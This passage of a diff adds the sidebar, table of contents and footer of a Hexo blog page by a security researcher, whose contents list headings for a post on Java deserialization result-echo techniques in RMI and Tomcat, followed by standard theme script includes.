+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xiaopan233" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://forum.butian.net/people/483" target="_blank" title="奇安信攻防社区">
+                      
+                        <i class="fa fa-fw fa-globe"></i>奇安信攻防社区</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.anquanke.com/member.html?memberId=144071" target="_blank" title="安全客">
+                      
+                        <i class="fa fa-fw fa-globe"></i>安全客</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.freebuf.com/author/xiaopan233" target="_blank" title="Freebuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Freebuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/xiaopan233/" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hui3c.club/" title="Hui3c 窝" target="_blank">Hui3c 窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.noerrorp.com/" title="YouGe的技术笔记" target="_blank">YouGe的技术笔记</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jingqingg.com/" title="惊青の小窝" target="_blank">惊青の小窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.luolingjiang.com/" title="洛翎酱的小窝" target="_blank">洛翎酱的小窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.petitstart.club/" title="Petitstart'Blog" target="_blank">Petitstart'Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RMI%E6%96%B9%E5%BC%8F%E5%9B%9E%E6%98%BE"><span class="nav-number">1.</span> <span class="nav-text">RMI方式回显</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tomcat%E5%9B%9E%E6%98%BE"><span class="nav-number">2.</span> <span class="nav-text">Tomcat回显</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91%EF%BC%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F"><span class="nav-number">2.1.</span> <span class="nav-text">修改程序逻辑，初始化静态变量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E5%AD%98%E5%82%A8"><span class="nav-number">2.2.</span> <span class="nav-text">全局存储</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%B0%E4%B8%AA%E6%B2%A1%E7%94%A8%E4%B8%9C%E8%A5%BF"><span class="nav-number">2.2.1.</span> <span class="nav-text">记个没用东西</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat7-%E5%8F%A6%E4%B8%80%E4%B8%AA%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F"><span class="nav-number">2.3.</span> <span class="nav-text">* Tomcat7 另一个静态变量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ClassLoader%E6%8B%BFContext"><span class="nav-number">2.4.</span> <span class="nav-text">* ClassLoader拿Context</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getServletContext"><span class="nav-number">2.5.</span> <span class="nav-text">* getServletContext()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NioEndpoint"><span class="nav-number">2.6.</span> <span class="nav-text">* NioEndpoint</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mapper"><span class="nav-number">2.7.</span> <span class="nav-text">Mapper</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E4%B8%8BTomcat%E5%9B%9E%E6%98%BE-%E4%B8%8D%E9%80%9A%E7%94%A8"><span class="nav-number">2.8.</span> <span class="nav-text">Linux下Tomcat回显 - 不通用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">3.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xiaopan233</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
